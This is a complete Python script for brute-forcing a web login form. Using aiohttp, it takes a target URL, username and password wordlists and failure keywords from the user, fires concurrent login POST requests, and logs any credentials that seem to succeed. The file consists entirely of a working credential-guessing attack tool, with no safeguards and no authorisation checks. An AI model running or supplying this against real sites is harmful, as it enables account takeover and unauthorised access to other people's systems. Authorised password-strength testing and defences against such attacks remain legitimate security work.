import aiohttp
import asyncio
import sys
import time
import logging

# Configure logging
logging.basicConfig(level=logging.INFO, format='[%(asctime)s] %(message)s')

# User inputs
TARGET_URL = input("Enter the target login URL: ").strip()
USE_USERNAME_WORDLIST = input("Use a username wordlist? (yes/no): ").strip().lower() == "yes"
USE_PASSWORD_WORDLIST = input("Use a password wordlist? (yes/no): ").strip().lower() == "yes"

# Load wordlists
def load_wordlist(filepath):
    try:
        with open(filepath, 'r') as file:
            return [line.strip() for line in file if line.strip()]
    except FileNotFoundError:
        logging.error(f"File not found: {filepath}")
        sys.exit()

# Get usernames
if USE_USERNAME_WORDLIST:
    USERNAME_WORDLIST_PATH = input("Enter username wordlist path: ").strip()
    usernames = load_wordlist(USERNAME_WORDLIST_PATH)
else:
    usernames = [input("Enter a single username: ").strip()]

# Get passwords
if USE_PASSWORD_WORDLIST:
    PASSWORD_WORDLIST_PATH = input("Enter password wordlist path: ").strip()
    passwords = load_wordlist(PASSWORD_WORDLIST_PATH)
else:
    passwords = [input("Enter a single password: ").strip()]

# Generic Error Indicators for Failed Login
# Collects all error keywords at once
ERROR_INDICATORS = input(
    "Enter all keywords indicating failed login (comma-separated): "
).strip().lower().split(',')

CONCURRENT_REQUESTS = int(input("Enter the number of concurrent requests: "))

logging.info(f"Starting brute force attack on {TARGET_URL}")

async def attempt_login(session, username, password):
    """Attempt a login and return credentials if successful."""
    data = {"username": username, "password": password}
    start_time = time.time()
    try:
        async with session.post(TARGET_URL, data=data) as response:
            text = await response.text()
            response_time = time.time() - start_time

            # Normalize text for comparison
            text = text.lower().strip()
            logging.info(f"Tested {username}:{password} | Response time: {response_time:.2f}s")

            # Check for failed login indicators
            if any(indicator.strip() in text for indicator in ERROR_INDICATORS):
                logging.warning(f"[FAILED] {username}:{password}")
                return "failed"

            # Check for common HTTP status codes indicating failure
            if response.status in [401, 403, 400]:
                logging.warning(f"[FAILED - STATUS CODE] {username}:{password} | Status: {response.status}")
                return "failed"

            # If no error indicators are found and status is OK, assume success
            if response.status == 200:
                logging.info(f"[SUCCESS] Valid credentials found: {username} | {password}")
                return username, password

    except aiohttp.ClientError as e:
        logging.error(f"Connection error: {e}")
    return None

async def brute_force():
    """Execute brute force attempts asynchronously."""
    connector = aiohttp.TCPConnector(limit_per_host=CONCURRENT_REQUESTS)
    async with aiohttp.ClientSession(connector=connector) as session:
        tasks = []
        semaphore = asyncio.Semaphore(CONCURRENT_REQUESTS)

        async def worker(username, password):
            async with semaphore:
                return await attempt_login(session, username, password)

        for username in usernames:
            for password in passwords:
                tasks.append(worker(username, password))

                if len(tasks) >= CONCURRENT_REQUESTS:
                    results = await asyncio.gather(*tasks)
                    tasks.clear()

                    for result in results:
                        # Stop further attempts if a success is found
                        if isinstance(result, tuple):
                            logging.info(f"[+] Valid credentials found: {result}")
                            return

        # Run remaining tasks
        results = await asyncio.gather(*tasks)
        for result in results:
            if isinstance(result, tuple):
                logging.info(f"[+] Valid credentials found: {result}")
                return

    logging.info("[!] Brute force complete. No valid credentials found.")

if __name__ == "__main__":
    asyncio.run(brute_force())
